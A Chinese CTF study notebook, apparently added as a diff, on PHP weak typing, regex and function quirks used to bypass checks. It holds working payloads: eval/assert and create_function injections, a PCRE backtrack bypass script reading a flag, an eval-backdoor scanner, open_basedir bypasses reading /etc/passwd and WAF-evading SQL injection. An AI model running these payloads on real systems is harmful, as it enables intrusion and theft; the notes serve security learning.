@@ -1,0 +1,706 @@
+(1)= == ===
+= 赋值
+==与!= 将类型转为相同类型再比较 
+		字符串中含.eE且满足数值在整数范围解释为float,但float中有不是正常的东西就是0
+		"admin"==0 "1admin"==1 "admin1"==0 1+"bob-1.3e3"==1  0e开头就是被默认为0了
+		1表示为ture     0是false和null    array表示null和false    ture==-1 "-1"
+		1.0000000000000001==1
+		===与！== 强比较都比了
+			array===array  name[]=a
+		比较漏洞-进制比较
+		在PHP中，只要开头为0X的字符串会被认为是16进制，在弱类型比较漏洞中16进制会先被转换成10进制在进行比较，所以只要传入一个带有0x的字符串也能够与数字进行比较并且返回真。
+		在php中,如果bool和"任何其他类型"比较,"任何其他类型"会转换为bool
+			- > 在PHP中当转换为 boolean 时，以下值被认为是 FALSE ：
+			- > (1) 布尔值 FALSE 本身
+			- > (2) 整型值 0（零）
+			- > (3)浮点型值 0.0（零）
+			- > (4)空字符串，以及字符串 “0”
+			- > (5)不包括何元素的数组(注意,一旦包含元素,就算包含的元素只是一个空数组,也是true)
+			- > (6)不包括任何成员变量的对象（仅 PHP 4.0 适用）
+			- > (7)特殊类型 NULL（包括尚未赋值的变量）
+			- > (8)从空标记生成的 SimpleXML 对象
+			- > (9)所有其它值包括-1都被认为是 TRUE （包括任何资源）
+(2)	intval		
+	变整型，在php5左右intval(a)与intval(a+1) a传入2e5 返回2和200001
+    intval()转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0
+	877%00a，再用intval函数获取整数部分得到877
+(3)md5
+      md5 ==md5($md5)
+	 常见MD5加密后为0e开头的字符串为：QNKCDZO、s878926199a、s155964671a、s214587387a、s214587387a、s878926199a、s1091221200a、s1885207154a、s1502113478a、s1885207154a、s1885207154a、s1836677006a、240610708等
+	因为md5函数不能处理数组，加密的数组的时候会返回NULL，对于这种情况也可以用来绕过某些场景，除此之外还有sha1()/strlen()/strcmp()/strpos()。
+	对于使用===强比较的情况，上面两种方法均失效。不过可以使用MD5加密后的两个完全相等的字符串来进行绕过，可以利用fastcoll来生成：fastcoll_v1.0.0.5.exe -p 1.txt -o 1 	
+(4)变量覆盖
+	extract
+		  $a="a";
+		  $array=array("a"=>"A","b"=>"B","c"=>"C");
+		  extract($array);
+		  就会有abc这几个变量了并且是ABC
+		extract() 函数使用数组键名作为变量名，使用数组键值作为变量值，当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。
+	parse_str函数
+		parse_str("name=uert&age=68",$myarr); 将name和age传入数组中  
+		parse_str函数将字符串解析成多个变量,如果设置了第二个变量 result，变量将会以数组元素的形式存入到这个数组，作为替代。
+	$$变量覆盖
+		$$变量覆盖要具体结合代码来看，可能会需要借助某个参数进行传递值，也有可能使用$GLOBALS（引用全局作用域中可用的全部变量）来做题
+(5)伪随机数	  
+	mt_rand
+	mt_srand
+	
+(6)ereg()
+	字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串时,如果遇到了%00,后面的字符串就不会被解析。
+	注：这里的%00是需要urldecode才可以截断的，这是url终止符，且%00长度是1不是3	
+(7)is_numeric()
+？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
+	利用数组+十六进制来进行绕过：a[]=58B
+	对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后如58%20s_numeric()仍然会认为它是一个数字
+	16进制也可以绕过is_numeric()检验，可以用来绕过sql注入里的过滤
+(8)str_replace(find,replace,string,count)
+     将匹配到的字符串替换为指定内容，不过这个函数可以通过双写来绕过这个替换，利用该特性可以绕过一些关键字替换的情况。如以下的情况：
+
+(9)preg_replace(pattern, replacement, subject, limit, count)
+
+   函数的/e匹配模式存在命令执行漏洞，不过单纯的替换字符串来说它并不存在双写绕过这种缺陷。
+	e 修饰符表示执行替换中的 PHP 代码（这是 PHP 5.5 之前的一个特性，现在已经被弃用），i 修饰符表示匹配时忽略大小写。
+	例子：return preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
+	'strtolower("\\1")' 是替换部分，其中 \\1 代表第一个捕获组的内容，这里的作用是将匹配到的文本转换为小写。
+ 我们让它变成
+ preg_replace('/(.*)/ei', 'strtolower("\\1")', {${phpinfo()}}); 
+ ？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
+ 
+ (10)if(preg_match('/^php$/im',$a)) 
+    /m为多行匹配，/i不区分大小写，/^php$/ ^表示以p开头和$表示以p结尾，看起来这段代码似乎很正常。问题在于：当出现%0A的时候会被当做两行处理，此时只匹配一行，后面的行会自动被忽略。实现绕过。
+	记住没有/m就要试试绕过，如果目标字符串 中没有 "\n" 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。
+	if (preg_match("/^\d+$/im",$num))
+	num=1%0als
+	所以^和$仍然会只匹配字符串开头%0a前面的内容，成功绕过第二个if。
+	preg_match(pattern, subject, matches, flags, offset);
+	pattern: 正则表达式模式，用于描述你想要匹配的文本格式。通常用斜杠 / 来包围正则表达式。
+	subject: 要搜索的字符串。
+	matches: （可选）数组，返回匹配结果。如果有匹配，matches[0] 包含完全匹配的部分，matches[1] 包含第一个捕获组的匹配内容，依此类推。
+	flags: （可选）控制匹配行为的标志，例如是否匹配所有结果（PREG_OFFSET_CAPTURE）。
+	offset: （可选）指定从字符串的哪个位置开始搜索。
+
+	常见匹配规则
+		字符类：匹配特定字符集中的任意字符。
+		[A-Za-z0-9]：匹配任意字母（大写或小写）或数字。
+		[0-9]：匹配任意数字。
+		[A-Z]：匹配任意大写字母。
+		[a-z]：匹配任意小写字母。
+		数量限定符：
+		+：匹配前一个字符一次或多次（1次或以上）。
+		*：匹配前一个字符零次或多次（0次或以上）。
+		?：匹配前一个字符零次或一次（0次或1次）。
+		{n}：匹配前一个字符恰好 n 次。
+		{n,}：匹配前一个字符至少 n 次。
+		{n,m}：匹配前一个字符至少 n 次，但不超过 m 次。
+		锚点：
+		^：匹配字符串的开始。
+		$：匹配字符串的结束。
+		预定义字符类:
+		\d 匹配任意数字（相当于 [0-9]）。
+		\D 匹配任意非数字字符。
+		\w 匹配任意字母、数字或下划线（相当于 [a-zA-Z0-9_]）。
+		\W 匹配任意非字母、非数字或非下划线字符。
+		\s 匹配任意空白字符（空格、制表符等）。
+		\S 匹配任意非空白字符。
+		量词:
+
+		{n} 精确匹配 n 次。
+		{n,} 至少匹配 n 次。
+		{n,m} 匹配 n 到 m 次。
+		* 匹配零次或多次（相当于 {0,}）。
+		+ 匹配一次或多次（相当于 {1,}）。
+		? 匹配零次或一次（相当于 {0,1}）。
+		preg_match('/a{3}/', 'aaa') // 匹配成功，匹配 "aaa"
+		preg_match('/a{2,4}/', 'aaaa') // 匹配成功，匹配 "aaaa"
+		捕获组:
+
+		使用圆括号 () 创建捕获组，捕获组中的内容会被捕获到 matches 数组中。
+		示例：/(hello) (world)/ 匹配 "hello world"，matches[1] 会是 "hello"，matches[2] 会是 "world"。
+		选择符 |:
+
+		用于匹配多个模式中的一个。
+		示例：/cat|dog/ 匹配 "cat" 或 "dog"。
+		锚点:
+
+		^ 匹配字符串的开头。
+		$ 匹配字符串的结尾。
+		示例：/^hello/ 匹配 "hello" 仅当它出现在字符串的开头。
+		hello$/ 匹配 "hello" 仅当它出现在字符串的结尾。
+		零宽断言:
+
+		肯定先行断言 (?=...)：匹配条件前面的位置，但不消耗字符。
+		否定先行断言 (?!...)：匹配条件前面的位置，并且不允许后面有特定内容。
+		肯定后行断言 (?<=...)：匹配条件后面的位置。
+		否定后行断言 (?<!...)：匹配条件后面的位置，但不允许前面有特定内容。
+		转义字符：\ 用于转义字符，使其具有特殊含义。例如 \d 匹配任何数字，\w 匹配任何单词字符。
+		(?R)?: 可选的递归匹配，用于处理嵌套函数调用。? 使得它变成可选的，以便处理最内层没有嵌套的函数调用。
+
+(11)urldecode ( string $str ) : string
+    解码已编码的URL字符串，因为发送请求的时候浏览器会自动进行一次解码，如果在代码中又执行urldecode就可能会存在绕过。
+    例如：发送?id = 1%2527--》php接收到为$id=1%27 如果在执行$id=urldecode($id) $id=1’	  
+(12)回调函数就是将一个函数作为参数传入另一个函数的函数。由于可以将函数作为参数传入执行，将一些危险的函数作为参数传入，可能成为一个不易检测的后门。在PHP中有常用的回调函数：call_user_func、call_user_func_array、array_map…
+    例如：call_user_func('assert', $_REQUEST["pass"]);
+         ssert()函数直接作为回调函数，以$_REQUEST["pass"]作为assert参数调用。
+
+(13)is_numberic
+	对于科学计数法来说转换后会保留e前面的数字，所以我们可以利用这个特性绕过。
+	?time=0.5276e7
+(14)	
+	
+	
+	比较漏洞-hash长度扩展攻击
+	  
+工具利用：HashPump/Hexpand/hash_extender
+python3 setup.py install  # 安装Python绑定
+hashpump -h 
+HashPump安装：
+1.git clone https://github.com/bwall/HashPump.git
+2.apt-get install g++ libssl-dev
+3.cd HashPump
+4.make && make install
+
+利用条件：
+1.使用hash(key || message)这种方式，且使用了MD5或SHA-1等基于Merkle–Damgård构造的哈希函数生成哈希值；
+2.让攻击者可以提交数据以及哈希值，虽然攻击者不知道密钥；
+3.服务器把提交的数据跟密钥构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值。
+扩展：若长度未知，可进行爆破，参考：https://blog.csdn.net/qq1045553189/article/details/87566846
+	  
+	  
+	  $c["m"] > 2022
+	  2023a通过
+	  
+	  
+(15)array_search	  是弱类型比较，这意味着在某些情况下，PHP 会将字符串与数字进行比较时转换为相同的类型。
+	  $d = array_search("DGGJ", $c["n"]);php就会把DGGJ转为0 d === false?die("no..."):NULL;，此时查找的就是0在数组里的位置了我们可以把0放在索引为1的地方，这样1===false不成立
+(16)create_function代码注入
+	但它从PHP 7.2.0开始被标记为已弃用，并在PHP 8.0.0中被移除。
+	$newfunc = create_function('$a,$b', 'return $a+$b;');
+	//等同于
+	function newfunc($a,$b){
+		return $a+$b;
+	}
+	$newfunc = create_function('', '}eval($_POST["cmd"]);//');
+	等同于
+	function newfunc(){
+	}eval($_POST["cmd"]);//}
+(17)通过构造动态调用函数
+	例子：  $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})
+	分析：  $pi=hex2bin("5f474554")=>_GET $$pi取出真正的_GET数组，$p得到的_GET只是字符串；因为[]被禁了就用{}代替，最后的得：
+	(_GET){pi}((_GET){abs})
+	？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
+	if (isset($text) && file_exists($file) && file_get_contents($file) === "I have a dream") {
+(18)使用 file_get_contents($file) 来读取文件内容，而不是 file_get_contents($text, 'r')
+	?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0
+	php://input 读取原始 POST 数据：
+	file_get_contents('php://input') 只能读取原始 POST 数据，而不是 $_POST 键值对。
+	例如，如果你发送的是 debu=aqua_is_cute&file=data://text/plain,debu_debu_aqua&shana[]=1&passwd[]=2，则 php://input 会读取整个 debu=aqua_is_cute&file=data://text/plain,debu_debu_aqua&shana[]=1&passwd[]=2 作为字符串
+(19)pcre回溯
+	  假设要匹配的正则是<\?.\*[(`;?>].\*，输入是`<?php phpinfo();//aaaaa`。NFA一点一点读正则表达式。
+	**<**\?.\*[(`;?>].\*<Br>
+	**<**?php phpinfo();//aaaaa
+	正则的<匹配了输入的<。当前匹配成功则读取下一个字符。
+	**<\?**.\*[(`;?>].\*<br>
+	**<\?** php phpinfo();//aaaaa
+	?也匹配成功，继续。
+	**<\?.\***[(`;?>].\*<br>
+	**<\? php phpinfo();//aaaaa**
+	`.*`会匹配完接下来的所有字符，目前是没什么问题，但是读取下一个正则时就出问题了。
+	**<\?.\*[(`;?>]**.\*<br>
+	**<\? php phpinfo();//aaaaa** ？
+	发现输入已经没东西匹配了。此时NFA开始回溯，回退之前匹配的字符。
+	**<\?.\*[(`;?>]**.\*<br>
+	**<\? php phpinfo();//aaaa**a ？
+	回退出来的字符a仍然无法匹配[(`;?>]。继续回溯。
+	**<\?.\*[(`;?>]**.\*<br>
+	**<\? php phpinfo();//aaa**aa ？
+	还是不行。回溯这一步骤会重复执行，直到回溯到下面的状态。
+	**<\?.\*[(`;?>]**.\*<br>
+	**<\? php phpinfo()**;//aaaaa ？
+	这一步回溯回退出来的字符是`;`，匹配正则表达式[(`;?>]。便停止回溯，匹配上字符。
+	**<\?.\*[(`;?>]**.\*<br>
+	**<\? php phpinfo();**//aaaaa
+	最后的一个正则表达式匹配完接下来的所有内容。
+	**<\?.\*[(`;?>].\***<br>
+	**<\? php phpinfo();//aaaaa**
+	完全匹配成功，返回true。如果我们数一下，会发现回溯次数为8，而回溯次数是有上限的，默认是100万。如果输入字符串执行正则时回溯次数超过了这个上限，就会返回f
+	alse。此false非彼False，`var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);`返回的结果是bool(true)。但这个false可以被强制转换，下面的waf：
+	$input = "SELECT * FROM users WHERE id = 1 UNION " . str_repeat("/*!A*/ ", 10000) . "SELECT name, email FROM users;";
+
+	if (preg_match('/UNION.+?SELECT/is', $input)) {
+		die('SQL Injection');
+	} else {
+		echo "No SQL Injection detected.";
+	}
+
+	就可以利用pcre的回溯次数限制绕过。但是下面的waf：
+	function is_php($data){  
+		return preg_match('/<\?.*[(`;?>].*/is', $data);  
+	}
+
+	if(is_php($input) === 0) {
+		// fwrite($f, $input); ...
+	}就不可以。使用了===强等于，PREG_BACKTRACK_LIMIT_ERROR不等于0。利用这一特点，我们可以在payload末尾加一堆a，使其超过回溯限制。
+
+	```python
+	import requests
+
+	payload = '{"cmd":"/bin/cat /home/rceservice/flag","test":"' + "a"*(1000000) + '"}'
+	res = requests.post("http://4610db05-7adf-404b-8c30-b1047f5c5703.node4.buuoj.cn:81/", data={"cmd":payload})
+	#print(payload)
+	print(res.text)
+	```
+	import requests
+
+	payload = '{"cmd":"/bin/cat /home/rceservice/flag","test":"' + "a"*(1000000) + '"}'
+	res = requests.post("http://4610db05-7adf-404b-8c30-b1047f5c5703.node4.buuoj.cn:81/", data={"cmd":payload})
+	#print(payload)
+	print(res.text)
+
+(20)json_decode($json, true)['cmd'];
+	  json_decode()是一个用于将 JSON 格式的字符串转换为 PHP 数据结构（数组或对象）的函数
+		$json 是输入的 JSON 字符串，它是一个有效的 JSON 格式的数据。
+		true 参数：
+		如果设置为 true，json_decode() 将返回一个关联数组。
+		如果设置为 false 或省略，则返回一个对象。
+		['cmd']:
+
+		在 PHP 中，方括号 [] 用于访问数组中的某个键对应的值。
+		json_decode($json, true) 返回的是一个关联数组，['cmd'] 是在这个数组中访问键为 cmd 的元素
+		示例
+		假设 $json 变量包含以下 JSON 数据：
+		$json = '{"cmd": "echo hello", "user": "admin"}';
+		运行过程
+		json_decode($json, true) 将 JSON 字符串解析为 PHP 关联数组：
+
+		$array = json_decode($json, true);
+		// $array 现在等于：["cmd" => "echo hello", "user" => "admin"]
+		$array['cmd'] 访问数组中的 cmd 键：
+
+		$command = $array['cmd'];
+		// $command 现在等于 "echo hello"
+		json_decode($json, false) 将 JSON 字符串解析为一个 PHP 对象：
+
+
+		$object = json_decode($json, false);
+		// $object 现在是一个对象，其属性如下：
+		// $object->cmd = "echo hello"
+		// $object->user = "admin"
+
+(21) assert注入
+ assert("intval($_GET[num])==1919810")
+ assert里面直接把我们的输入拼接进去了?num=114514)==114514;//
+ 
+(22)strstr()
+- > 搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。
+- > 语法：strstr(string,search,before_search)
+- > string:必需。规定被搜索的字符串。
+- > search:必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。
+- > before_serach:可选。一个默认值为 "false" 的布尔值。如果设置为 "true"，它将返回 search 参数第一次出现之前的字符串部分。
+注意这个函数是大小写敏感的。这里可以用PHP://绕过，也可以考虑另外一个php伪协议：data://
+
+(23) mb_substr()
+- > 返回字符串的一部分，中文字符也可以使用。substr() 只针对英文字符
+- > 语法：mb_substr(字符串，起始，长度，编码)，其中长度和编码可选。
+将土耳其语中的 "İstanbul" 转换为小写时，可能输出带点的 "i"（"i̇stanbul"）
+卖个关子，待补坑
+(24) mb_strpos()
+- > 返回要查找的字符串在别一个字符串中首次出现的位置
+- > 语法：mb_strpos (字符串,要搜索的字符串)
+因为mb_strpos()只会返回首次出现的位置，所以如果我们传类似于 hint.php?想要查看的文件路径 这样的payload的话，切割的结果是hint.php，通过了过滤。问题是过滤通过了后这个paylaod根本就不是一个有效的文件名啊？
+不急。include有一个很有趣的特性：
+- 如果参数中包含../这样的路径，解析器则会忽略../之前的字符串而去在当前目录的父目录下寻找文件
+这意味着我们只要在想要查看的文件路径中使用../这类路径，include就会自动忽略前面的内容，这样真正包含的文件名就是有效的了。一点一点试就可以得到正确的路径了。
+
+(24)文件存在
+ `file_exists()` 返回布尔值：
+* 如果文件存在，则返回 `TRUE`
+* 如果文件不存在，则返回 `FALSE` 
+  与其他相关函数不同的是：
+* `is_file($filename)` 仅检查文件是否存在，并且必须是一个文件，而不是目录。
+* `is_dir($filename)` 检查是否存在一个目录，哪怕它是空的。
+  
+(25) strpos
+ 查找字符串在另一字符串中第一次出现的位置（区分大小写）,如果没有找到字符串则返回 FALSE。
+templates/'.system('cat+./templates/flag.php').'.php
+assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
+assert("strpos('templates/'.system('cat+./templates/flag.php').'.php', '..') === false") or die("Detected hacking attempt!");
+
+	  
+	  
+	  
+辑漏洞绕过
+
+源码如下：
+
+```php
+<?php
+show_source(__FILE__);
+$v1=0;$v2=0;$v3=0;
+$a=(array)json_decode(@$_GET['foo']);
+if(is_array($a)){
+   is_numeric(@$a["bar1"])?die("nope"):NULL;
+   if(@$a["bar1"]){
+       ($a["bar1"]>2021)?$v1=1:NULL;
+   }
+   if(is_array(@$a["bar2"])){
+       if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope");
+       $pos = array_search("me7e", $a["a2"]);
+       $pos===false?die("nope"):NULL;
+       foreach($a["bar2"] as $key=>$val){
+           $val==="me7e"?die("nope"):NULL;
+       }
+       $v2=1;
+   }
+}
+$c=@$_GET['cat'];
+$d=@$_GET['dog'];
+if(@$c[1]){
+   if(!strcmp($c[1],$d) && $c[1]!==$d){
+       eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
+       strpos(($c[0].$d), "me7e2021")?$v3=1:NULL;
+   }
+}
+if($v1 && $v2 && $v3)
+{
+   include "flag.php";
+   echo $flag13;
+}
+?> 
+```
+
+
+
+第一层： 需要传入一个不是数字但是大于2021的参数，根据弱比较可以让bar1=2022asd
+第二层: bar2有5个元素，并且第一个是数组，让bar2=[[0],2,3,4,5]，通过弱比较绕过array_search的搜索 
+第三层：因为是php5,且eregi存在00截断可以直接绕过
+
+所以可以构造`?foo={"bar1":"2022asd","bar2":[[0],2,3,4,5],"a2":"me7eorite"}&cat[1][]="1"&dog=what&cat[0]=%00me7e2021`
+	  
+	  
+	  
+5. 代码混淆(强网杯2019-高明的黑客)
+
+首页提示了源码泄露下载下来后发现有3千多个文件，而且文件中有eval还有asset但是有些没有执行命令的功能，似乎是被混淆了。
+
+通过编写一个脚本遍历这些eval和asset方法找到一个能够执行命令的功能。exp如下：
+
+```python
+import os
+import requests
+import re
+import threading
+import time
+print('start：  '+  time.asctime( time.localtime(time.time()) ))
+s1=threading.Semaphore(100)                                           
+filePath = r"H:\Programmar\phpstudy_pro\WWW\src"
+os.chdir(filePath)                                                    
+requests.adapters.DEFAULT_RETRIES = 5                             
+files = os.listdir(filePath)
+session = requests.Session()
+session.keep_alive = False                                           
+def get_content(file):
+    s1.acquire()                                                
+    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))
+    with open(file,encoding='utf-8') as f:                            
+            gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
+            posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
+    data = {}                                                     
+    params = {}                                                       
+    for m in gets:
+        params[m] = "echo 'xxxxxx';"
+    for n in posts:
+        data[n] = "echo 'xxxxxx';"
+    url = 'http://101.43.122.252:8004/'+file
+    req = session.post(url, data=data, params=params)          
+    req.close()                                                
+    req.encoding = 'utf-8'
+    content = req.text
+    #print(content)
+    if "xxxxxx" in content:                                    
+        flag = 0
+        for a in gets:
+            req = session.get(url+'?%s='%a+"echo 'xxxxxx';")
+            content = req.text
+            req.close()                                              
+            if "xxxxxx" in content:
+                flag = 1
+                break
+        if flag != 1:
+            for b in posts:
+                req = session.post(url, data={b:"echo 'xxxxxx';"})
+                content = req.text
+                req.close()                                               
+                if "xxxxxx" in content:
+                    break
+        if flag == 1:                                                   
+            param = a
+        else:
+            param = b
+        print('file: '+file+"  and param:%s" %param)
+        print('endtime: ' + time.asctime(time.localtime(time.time())))
+    s1.release()
+
+for i in files:                                                            
+    t = threading.Thread(target=get_content, args=(i,))
+    t.start()
+```
+
+
+
+替换脚本中的地址为本地PHP解压后的地址	修改url地址方便测试能够执行命令。
+
+![image-20220529013728647](WritenUp.assets\image-20220529013728647.png)
+
+因为写的是多线程会出现无法中断的情况，需要留意一下这个文件。
+
+![image-20220529013509303](WritenUp.assets\image-20220529013509303.png)
+
+然后再题目环境中执行命令查看`flag.txt`获取到flag
+
+![image-20220529014035445](WritenUp.assets\image-20220529014035445.png)
+
+#flag{this_is_smart_hacker_flag}
+  
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+100.0010正和反值相等但并非是回文序列
+get{var]  ?var[变量名]  ?var[template][tp1]=xxx&var[template][tp2]=xxx  数组template中的tp1
+			var[]=aaaa 默认传了var[0]=aaaa
+通过变量覆盖
+ extract($_GET["flag"]);	
+传 flag[arg]=}var_dump(get_defined_vars());//&flag[code]=create_function
+			
+	  
+PHP	特性
+	  
+(1)我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => "bar")。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
+		/news.php?%20news[id%00=42"+AND+1=0--
+		上述PHP语句的参数%20news[id%00的值将存储到$_GET["news_id"]中。
+		HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
+		1.删除空白符
+		2.将某些字符转换为下划线（包括空格）
+		  %20foo_bar%00            	                foo_bar            	                foo_bar            
+						foo%20bar%00            	                foo bar            	                foo_bar            
+						foo%5bbar            	                foo[bar            	                foo_bar     
+		?%20num=var_dump(scandir(chr(47)))
+
+		[$_SERVER['PHP_SELF']](http://www.5idev.com/p-php_server_php_self.shtml)表示当前 php 文件相对于网站根目录的位置地址，例如：
+		http://www.5idev.com/php/ ：/php/index.php
+		http://www.5idev.com/php/index.php ：/php/index.php
+		http://www.5idev.com/php/index.php?test=foo ：/php/index.php
+		http://www.5idev.com/php/index.php/test/foo ：/php/index.php/test/foo
+		[basename](https://www.php.net/manual/zh/function.basename.php)则是返回路径中的文件名部分。但是basename有个特性，如果文件名是一个不可见字符，便会将上一个目录作为返回值。比如：
+		highlight_file(basename($_SERVER['PHP_SELF']));
+		$var1="/config.php/test"
+		basename($var1)	=> test
+		$var2="/config.php/%ff"
+		basename($var2)	=>	config.php
+		当我们访问一个`存在的文件/不存在的文件`这个url时，php会自动忽略多余的不存在的部分，比如下面两种url：
+		/index.php
+		/index.php/dosent_exist.php
+(2)include有一个很有趣的特性：
+		- 如果参数中包含../这样的路径，解析器则会忽略../之前的字符串而去在当前目录的父目录下寻找文件
+		这意味着我们只要在想要查看的文件路径中使用../这类路径，include就会自动忽略前面的内容，这样真正包含的文件名就是有效的了。一点一点试就可以得到正确的路径了。
+
+(3) CURLOPT_POSTFIELDS
+- > 全部数据使用HTTP协议中的 "POST" 操作来发送。 要发送文件，在文件名前面加上@前缀并使用完整路径。 文件类型可在文件名后以 ';type=mimetype' 的格式指定。 这个参数可以是 urlencoded 后的字符串，类似'para1=val1&para2=val2&...'，也可以使用一个以字段名为键值，字段数据为值的数组。 如果value是一个数组，Content-Type头将会被设置成multipart/form-data。 从 PHP 5.2.0 开始，使用 @ 前缀传递文件时，value 必须是个数组。 从 PHP 5.5.0 开始, @ 前缀已被废弃，文件可通过 CURLFile 发送。 设置 CURLOPT_SAFE_UPLOAD 为 true 可禁用 @ 前缀发送文件，以增加安全性。
+- ### CURLOPT_SAFE_UPLOAD
+- > 默认true。禁用 @ 前缀在 CURLOPT_POSTFIELDS 中发送文件。 意味着 @ 可以在字段中安全地使用了。 可使用 CURLFile 作为上传的代替。
+- > PHP 5.5.0 中添加，默认值 false。 PHP 5.6.0 改默认值为 true。PHP 7 删除了此选项， 必须使用 CURLFile interface 来上传文件
+@符号出现了。这里的意思就是如果CURLOPT_SAFE_UPLOAD为False，那么在CURLOPT_POSTFIELDS要发送的文件名前面加上@就可以使用完整路径读取文件了。此时问题又来到了经典的文件任意读取。问题是，读取啥文件呢？我们现在完全不知道flag文件在哪。
+上传还读取
+
+（4）无参函数可接受参数
+<?php
+function a(){
+	echo "1";
+}
+a('1','2');
+
+（5）命名空间
+ 可以简单地理解为一个“文件夹”或“目录”，它用来组织和管理代码中的类、函数、常量等元素，避免名称冲突
+ 命名空间 A 和命名空间 B 就像是两个文件夹，每个文件夹里都有一个名为 sayHello() 的函数。由于它们处于不同的命名空间（文件夹）中，所以函数不会互相冲突。
+ 当你在PHP脚本中不指定命名空间时，代码运行在全局命名空间中。PHP不允许在全局命名空间中重写内置函数（如 sha1()）
+ 命名空间的声明方式有两种：封闭命名空间 和 开放命名空间。你提到的 namespace interesting; 是 开放命名空间 的一种声明方式，它不需要使用 {} 包围代码块。下面
+ <?php
+
+namespace test1{
+	function a(){
+		echo 'a';
+	}
+}
+
+namespace test2{
+	function b(){
+		echo 'b';
+	}
+	function phpinfo(){
+		echo 'phpinfo changed';
+	}
+
+}
+
+namespace{
+	\test1\a(); # 输出: a
+	\test2\b(); # 输出: b
+}php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。
+如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。
+<?php
+namespace MyNamespace;
+
+function phpinfo() {
+    echo "Custom phpinfo in MyNamespace";
+}
+phpinfo();  // 调用 MyNamespace\phpinfo()，输出 "Custom phpinfo in MyNamespace"
+\phpinfo(); // 调用全局命名空间中的 phpinfo()，输出 PHP 配置信息
+?>
+例子：
+<?php
+$action = $_GET['action'] ?? '';
+$arg = $_GET['arg'] ?? '';
+
+if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
+    show_source(__FILE__);
+} else {
+    $action('', $arg);
+}
+传\create_function
+
+（5）匿名函数
+变量赋值示例
+<?php
+$greet = function($name)
+{
+    printf("Hello %s\r\n", $name);
+};
+
+$greet('World');
+$greet('PHP');
+?>
+回调函数对匿名函数的调用
+<?php
+echo preg_replace_callback('~-([a-z])~', function ($match) {
+    return strtoupper($match[1]);
+}, 'hello-world');
+// 输出 helloWorld
+?>
+使用USE闭包
+可以从父作用域中继承变量。 任何此类变量都应该用 use 语言结构传递进去。 `PHP7.1`起，不能传入此类变量：`superglobals`、`$this`或者和参数重名。
+<?php
+$message = 'hello';
+
+$example = function () {
+    var_dump($message);
+};
+#echo $example();  // Notice: Undefined variable: message 
+
+$example = function () use ($message) {
+    var_dump($message);
+};
+echo $example();  // string(5) "hello"
+
+
+$message = 'world'; 
+echo $example();   //string(5) "hello"
+
+$example = function ($arg) use ($message) {
+    var_dump($arg . ' ' . $message);
+};
+$example("hello");   // string(11) "hello world"
+?>
+（6）open_basedir 
+是 PHP 中的一个配置选项，用于限制脚本可以访问的文件系统路径范围
+例子open_basedir = /var/www/html/:/tmp/   PHP 脚本只能访问 /var/www/html/ 目录及其子目录，和 /tmp/ 目录。
+php.ini 文件中设置 open_basedir 选项
+绕过
+利用ini_set和chidr   PHP 配置中未禁用 ini_set 的使用
+参考
+<?php
+chdir('subDir');
+ini_set('open_basedir','..');
+chdir('..');
+chdir('..');
+chdir('..');
+ini_set('open_basedir','/');
+$a=file_get_contents('/etc/passwd');
+var_dump($a);
+利用symlink
+mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);
+symlink('/var/www/html/a/b/c/d/e/f/g','foo');
+ini_set('open_basedir','/var/www/html:bar/');
+symlink('foo/../../../../../../','bar');
+unlink('foo');
+symlink('/var/www/html','foo');
+echo file_get_contents('bar/etc/passwd');
+（6）PHP是一门动态语言
+动态语言指在运行时确定数据类型的语言，它拥有一些独特的特性入：动态变量、动态函数执行等。
+<?php
+$_GET['a']='cc';
+#$a是$_GET的中间变量,$_GET是最终变量
+$a='_GET';
+var_dump($$a); //第一个$是找到$a是_GET第二个是找到$_GET 想$this
+
+$_POST='asdf';
+$asdf='ccc';
+var_dump($$_POST);
+
+可变属性名
+<?php
+class foo {
+    var $bar = 'I am bar.';
+    var $arr = array('I am A.', 'I am B.', 'I am C.');
+    var $r   = 'I am r.';
+}
+
+$foo = new foo();
+$bar = 'bar';
+$baz = array('foo', 'bar', 'baz', 'quux');
+echo $foo->$bar . "\n";
+echo $foo->{$baz[1]} . "\n";   等同于 $foo->bar。因此，输出结果也是 'I am bar.
+
+$start = 'b';
+$end   = 'ar';
+echo $foo->{$start.$end} . "\n";
+
+$arr = 'arr';
+echo $foo->{$arr[1]} . "\n"; 所以 $foo->{$arr[1]} 实际上是  $foo->r
+
+可变变量
+<?php
